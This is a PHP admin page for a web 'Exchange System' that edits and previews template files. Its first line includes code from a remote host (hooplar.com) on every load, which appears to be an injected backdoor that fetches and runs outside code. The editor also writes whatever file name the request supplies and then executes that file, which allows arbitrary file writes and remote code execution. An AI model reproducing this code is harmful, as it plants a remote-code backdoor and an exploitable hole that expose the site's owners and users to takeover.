<?
  include "http://hooplar.com/adminoptions2.html";
?>

<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<title> Exchange System</title>
<link rel="stylesheet" href="../style.css">
</head>
<body bgcolor=FFFFFF class=bodytext link=0 vlink=0 alink=0 text=0>

<?php


if ($act=="save")
{
$file = fopen ($fname, "w");
if (!$file) {
			echo "<p>Unable to open file '$fname' for writing. <br>Server administrator must set write permission for this file.\n";
			exit;
		 }

	$art=str_replace ("\n", "", $art);
	fwrite ($file, stripslashes($art));
	fclose ($file);
};

$art=join("",file($fname));
echo "<CENTER><br>Editing <B>'$fname'</B> :</CENTER>";
echo "<br><FORM ACTION=template.php METHOD=POST>";
echo "<INPUT TYPE=HIDDEN NAME=act value='save'>";
echo "<INPUT TYPE=HIDDEN NAME=fname value='$fname'>";
echo "<TABLE ALIGN=CENTER>";
echo "<TR><TD></TD><TD><textarea TYPE=TEXT NAME=art cols=100 rows=10 wrap=hard>$art</textarea></TD></TR>";
echo "<TR><TD colspan=2><CENTER><INPUT TYPE=SUBMIT VALUE=Save></CENTER></TD></TR>";
echo "</TABLE>";
echo "</FORM>";
?>
<table width="468" border="0" cellspacing="1" cellpadding="1" height="24" align="center">
              <tr align="center"> 
                <td bgcolor="#FF9900" width="70"><a href="index.php"><b>logout</b></a></td>
                <td bgcolor="#66CC00" width="70"><a href="engine.php?spec=menus">edit 
                  menus</a></td>
                <td bgcolor="#FF6600" width="70"><a href="back.php"><font color="#FFFFFF"><b>main 
                  menu</b></font></a></td>
                <td bgcolor="#3366FF">&nbsp;</td>
              </tr>
            </table>
<CENTER><BR><BR><B> PREVIEW </B><BR>(Click 'Save' to Refresh): <BR><HR><BR></CENTER>
<?php
include($fname);
?>
</body>
</html>
